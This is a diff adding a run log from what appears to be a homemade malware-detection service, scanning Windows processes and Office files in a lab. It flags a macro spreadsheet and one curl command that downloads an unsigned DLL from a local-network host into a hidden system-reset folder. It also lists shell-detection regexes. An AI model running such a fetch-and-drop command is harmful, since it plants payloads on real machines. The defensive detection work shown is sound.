@@ -1,0 +1,125 @@
+[2025-06-12 21:51:30,790] [INFO] Analyzer initiated...
+[2025-06-12 21:51:30,791] [DEBUG] Compiled command patterns: [re.compile('.*\\.vscode-server.*code-.*\\.exe.*command-shell.*', re.IGNORECASE), re.compile('.*\\.vscode-server.*code-server\\.cmd.*--connection-token=remotessh.*', re.IGNORECASE), re.compile('.*\\.vscode-server.*shellIntegration\\.ps1.*', re.IGNORECASE), re.compile('.*cmd\\.exe /c powershell$', re.IGNORECASE), re.compile('.*powershell\\.exe -noexit -command try.*', re.IGNORECASE), re.compile('.*powershell\\.exe$', re.IGNORECASE)]
+[2025-06-12 21:51:40,548] [INFO] Analyzing process with PID: 4744 - Name: brave.exe
+[2025-06-12 21:51:40,557] [WARNING] Process brave.exe-4744 is running cmd: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --field-trial-handle=2152,i,7152743403188504904,14203605877254485089,262144 --variations-seed-version=main@e8d540b9c9901d942721dd05760d8ddf4f61aba5 --mojo-platform-channel-handle=896 /prefetch:8
+[2025-06-12 21:51:40,910] [INFO] Process 4744 has suspicious DLL: brave.exe
+[2025-06-12 21:51:40,912] [INFO] Process brave.exe-4744 deemed safe (Score: 0)
+[2025-06-12 21:51:52,389] [INFO] Analyzing process with PID: 8480 - Name: brave.exe
+[2025-06-12 21:51:52,400] [WARNING] Process brave.exe-8480 is running cmd: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe --type=utility --utility-sub-type=quarantine.mojom.Quarantine --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --field-trial-handle=2152,i,7152743403188504904,14203605877254485089,262144 --variations-seed-version=main@e8d540b9c9901d942721dd05760d8ddf4f61aba5 --mojo-platform-channel-handle=4732 /prefetch:8
+[2025-06-12 21:51:52,406] [INFO] Analyzing Office file: C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[2025-06-12 21:51:52,806] [INFO] Process brave.exe-8480 deemed safe (Score: 0)
+[2025-06-12 21:51:53,485] [ERROR] Unexpected error analyzing process 8548: process PID not found (pid=8548)
+[2025-06-12 21:51:54,663] [INFO] Analyzing process with PID: 8728 - Name: handle.exe
+[2025-06-12 21:51:54,667] [CRITICAL] Process handle.exe-8728 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[2025-06-12 21:51:54,671] [WARNING] Process handle.exe-8728 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[2025-06-12 21:51:54,672] [INFO] Process handle.exe-8728 is running as SYSTEM
+[2025-06-12 21:51:54,961] [INFO] Process 8728 has suspicious DLL: handle.exe
+[2025-06-12 21:51:54,962] [INFO] Process handle.exe-8728 deemed safe (Score: 40)
+[2025-06-12 21:51:57,236] [CRITICAL] File C:\Users\null\Downloads\Win10_Enc_Only.xlsm is malicious (Score: 570)
+[2025-06-12 21:51:57,323] [INFO] Analyzing Office file: C:\Users\null\Downloads\Win10_Enc_Only_clean.xlsm
+[2025-06-12 21:52:08,341] [INFO] Analyzing process with PID: 3512 - Name: smartscreen.exe
+[2025-06-12 21:52:08,343] [CRITICAL] Process smartscreen.exe-3512 has suspicious command: C:\Windows\System32\smartscreen.exe -Embedding
+[2025-06-12 21:52:08,345] [WARNING] Process smartscreen.exe-3512 is running cmd: C:\Windows\System32\smartscreen.exe -Embedding
+[2025-06-12 21:52:08,712] [INFO] Process smartscreen.exe-3512 deemed safe (Score: 20)
+[2025-06-12 21:52:08,841] [INFO] Analyzing process with PID: 9916 - Name: excel.exe
+[2025-06-12 21:52:08,846] [CRITICAL] Process excel.exe-9916 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:52:08,849] [WARNING] Process excel.exe-9916 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:52:09,318] [INFO] Process 9916 has suspicious DLL: excel.exe
+[2025-06-12 21:52:09,326] [CRITICAL] Process excel.exe-9916 is malicious (Score: 70)
+[2025-06-12 21:52:32,639] [INFO] Analyzing process with PID: 9704 - Name: excel.exe
+[2025-06-12 21:52:32,642] [CRITICAL] Process excel.exe-9704 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:52:32,645] [WARNING] Process excel.exe-9704 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:52:32,876] [INFO] Process 9704 has suspicious DLL: excel.exe
+[2025-06-12 21:52:32,882] [CRITICAL] Process excel.exe-9704 is malicious (Score: 70)
+[2025-06-12 21:53:15,013] [INFO] Analyzing process with PID: 4748 - Name: git-remote-https.exe
+[2025-06-12 21:53:15,017] [WARNING] Process git-remote-https.exe-4748 is running cmd: git-remote-https origin https://github.com/Witnull/EvilMacroDetector.git
+[2025-06-12 21:53:15,227] [INFO] Process git-remote-https.exe-4748 deemed safe (Score: 0)
+[2025-06-12 21:53:15,391] [ERROR] Unexpected error analyzing process 5992: process PID not found (pid=5992)
+[2025-06-12 21:54:06,040] [INFO] Analyzing process with PID: 10024 - Name: excel.exe
+[2025-06-12 21:54:06,043] [CRITICAL] Process excel.exe-10024 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:54:06,047] [WARNING] Process excel.exe-10024 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:54:06,355] [INFO] Process 10024 has suspicious DLL: excel.exe
+[2025-06-12 21:54:06,361] [CRITICAL] Process excel.exe-10024 is malicious (Score: 70)
+[2025-06-12 21:54:16,711] [INFO] Analyzing process with PID: 6296 - Name: excel.exe
+[2025-06-12 21:54:16,714] [CRITICAL] Process excel.exe-6296 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:54:16,718] [WARNING] Process excel.exe-6296 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[2025-06-12 21:54:16,909] [INFO] Process 6296 has suspicious DLL: excel.exe
+[2025-06-12 21:54:16,915] [CRITICAL] Process excel.exe-6296 is malicious (Score: 70)
+[2025-06-12 21:54:19,931] [INFO] Analyzing process with PID: 7696 - Name: excel.exe
+[2025-06-12 21:54:19,935] [CRITICAL] Process excel.exe-7696 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Oly.xlsm
+[2025-06-12 21:54:19,937] [WARNING] Process excel.exe-7696 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Oly.xlsm
+[2025-06-12 21:54:20,145] [INFO] Process 7696 has suspicious DLL: excel.exe
+[2025-06-12 21:54:20,146] [INFO] Process excel.exe-7696 deemed safe (Score: 20)
+[2025-06-12 21:54:24,259] [INFO] Analyzing process with PID: 8404 - Name: curl.exe
+[2025-06-12 21:54:24,264] [CRITICAL] Process curl.exe-8404 has suspicious command: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:24,269] [WARNING] Process curl.exe-8404 is running cmd: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:24,571] [INFO] Analyzing EXEcutable file: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:24,576] [WARNING] EXE in non-standard path: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:24,759] [CRITICAL] Process curl.exe-8404 is malicious (Score: 70)
+[2025-06-12 21:54:25,286] [WARNING] Unsigned EXE: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:25,680] [ERROR] Unexpected error analyzing process 6364: process PID not found (pid=6364)
+[2025-06-12 21:54:25,822] [ERROR] Unexpected error analyzing process 6476: process PID not found (pid=6476)
+[2025-06-12 21:54:26,531] [INFO] Analyzing process with PID: 1660 - Name: handle.exe
+[2025-06-12 21:54:26,545] [CRITICAL] Process handle.exe-1660 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:26,546] [WARNING] Process handle.exe-1660 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:26,548] [INFO] Process handle.exe-1660 is running as SYSTEM
+[2025-06-12 21:54:26,968] [INFO] Process 1660 has suspicious DLL: handle.exe
+[2025-06-12 21:54:26,969] [INFO] Process handle.exe-1660 deemed safe (Score: 40)
+[2025-06-12 21:54:27,246] [INFO] Analyzing process with PID: 4284 - Name: systemresetplatform.exe
+[2025-06-12 21:54:27,255] [WARNING] Process systemresetplatform.exe-4284 is running cmd: C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe
+[2025-06-12 21:54:27,572] [CRITICAL] Process systemresetplatform.exe-4284 is malicious (Score: 50)
+[2025-06-12 21:54:28,318] [ERROR] Unexpected error analyzing process 1564: process PID not found (pid=1564)
+[2025-06-12 21:54:28,543] [ERROR] Unexpected error analyzing process 9164: process PID not found (pid=9164)
+[2025-06-12 21:54:29,421] [INFO] EXE rjvplatform.dll is in watchlist
+[2025-06-12 21:54:29,430] [CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[2025-06-12 21:54:29,450] [INFO] Analyzing EXEcutable file: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:29,451] [WARNING] EXE in non-standard path: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:29,716] [WARNING] Unsigned EXE: C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:30,115] [INFO] Analyzing process with PID: 2360 - Name: manalyze.exe
+[2025-06-12 21:54:30,144] [ERROR] Unexpected error analyzing process 2360: process no longer exists (pid=2360, name='manalyze.exe')
+[2025-06-12 21:54:31,208] [INFO] Analyzing process with PID: 6852 - Name: handle.exe
+[2025-06-12 21:54:31,216] [CRITICAL] Process handle.exe-6852 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:31,219] [WARNING] Process handle.exe-6852 is running cmd: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[2025-06-12 21:54:31,220] [INFO] Process handle.exe-6852 is running as SYSTEM
+[2025-06-12 21:54:32,087] [INFO] Process 6852 has suspicious DLL: handle.exe
+[2025-06-12 21:54:32,090] [INFO] Process handle.exe-6852 deemed safe (Score: 40)
+[2025-06-12 21:54:33,609] [INFO] Analyzing process with PID: 6832 - Name: sppsvc.exe
+[2025-06-12 21:54:33,613] [WARNING] Process sppsvc.exe-6832 is running cmd: C:\Windows\system32\sppsvc.exe
+[2025-06-12 21:54:33,875] [INFO] Process sppsvc.exe-6832 deemed safe (Score: 0)
+[2025-06-12 21:54:34,311] [INFO] EXE rjvplatform.dll is in watchlist
+[2025-06-12 21:54:34,325] [CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[2025-06-12 21:54:34,690] [INFO] Analyzing process with PID: 10116 - Name: filecoauth.exe
+[2025-06-12 21:54:34,694] [WARNING] Process filecoauth.exe-10116 is running cmd: C:\Program Files\Microsoft OneDrive\25.091.0512.0001\FileCoAuth.exe -Embedding
+[2025-06-12 21:54:35,131] [INFO] Process 10116 has suspicious DLL: filecoauth.exe
+[2025-06-12 21:54:35,132] [INFO] Process filecoauth.exe-10116 deemed safe (Score: 0)
+[2025-06-12 21:55:33,290] [INFO] Analyzing process with PID: 5992 - Name: splwow64.exe
+[2025-06-12 21:55:33,293] [WARNING] Process splwow64.exe-5992 is running cmd: C:\Windows\splwow64.exe 8192
+[2025-06-12 21:55:33,527] [INFO] Process 5992 has suspicious DLL: splwow64.exe
+[2025-06-12 21:55:33,529] [INFO] Process splwow64.exe-5992 deemed safe (Score: 0)
+[2025-06-12 21:56:15,868] [INFO] Analyzing process with PID: 3600 - Name: git-remote-https.exe
+[2025-06-12 21:56:15,870] [WARNING] Process git-remote-https.exe-3600 is running cmd: git-remote-https origin https://github.com/Te-k/pecli.git
+[2025-06-12 21:56:16,127] [INFO] Process 3600 has suspicious DLL: git-remote-https.exe
+[2025-06-12 21:56:16,129] [INFO] Process git-remote-https.exe-3600 deemed safe (Score: 0)
+[2025-06-12 21:56:16,276] [INFO] Analyzing process with PID: 8680 - Name: git-remote-https.exe
+[2025-06-12 21:56:16,279] [WARNING] Process git-remote-https.exe-8680 is running cmd: git-remote-https origin https://github.com/Witnull/EvilMacroDetector.git
+[2025-06-12 21:56:16,479] [INFO] Process 8680 has suspicious DLL: git-remote-https.exe
+[2025-06-12 21:56:16,481] [INFO] Process git-remote-https.exe-8680 deemed safe (Score: 0)
+[2025-06-12 21:56:47,903] [INFO] Analyzing process with PID: 7688 - Name: microsoftedgeupdate.exe
+[2025-06-12 21:56:47,906] [CRITICAL] Process microsoftedgeupdate.exe-7688 has suspicious command: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua /installsource scheduler
+[2025-06-12 21:56:47,909] [WARNING] Process microsoftedgeupdate.exe-7688 is running cmd: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua /installsource scheduler
+[2025-06-12 21:56:47,910] [INFO] Process microsoftedgeupdate.exe-7688 is running as SYSTEM
+[2025-06-12 21:56:48,106] [INFO] Process microsoftedgeupdate.exe-7688 deemed safe (Score: 40)
+[2025-06-12 21:56:48,224] [INFO] Analyzing process with PID: 8532 - Name: svchost.exe
+[2025-06-12 21:56:48,227] [WARNING] Process svchost.exe-8532 is running cmd: C:\Windows\system32\svchost.exe -k wsappx -p
+[2025-06-12 21:56:48,228] [INFO] Process svchost.exe-8532 is running as SYSTEM
+[2025-06-12 21:56:48,411] [INFO] Process svchost.exe-8532 deemed safe (Score: 20)
+[2025-06-12 21:57:22,222] [INFO] Analyzing process with PID: 6700 - Name: python.exe
+[2025-06-12 21:57:22,226] [CRITICAL] Process python.exe-6700 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py stop
+[2025-06-12 21:57:22,228] [WARNING] Process python.exe-6700 is running cmd: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py stop
+[2025-06-12 21:57:22,509] [INFO] Process 6700 has suspicious DLL: python.exe
+[2025-06-12 21:57:22,511] [INFO] Process python.exe-6700 deemed safe (Score: 20)
+[2025-06-12 21:57:36,161] [INFO] Analyzing process with PID: 7524 - Name: python.exe
+[2025-06-12 21:57:36,163] [CRITICAL] Process python.exe-7524 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py remove
+[2025-06-12 21:57:36,164] [WARNING] Process python.exe-7524 is running cmd: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py remove
+[2025-06-12 21:57:36,446] [INFO] Process 7524 has suspicious DLL: python.exe
+[2025-06-12 21:57:36,447] [INFO] Process python.exe-7524 deemed safe (Score: 20)
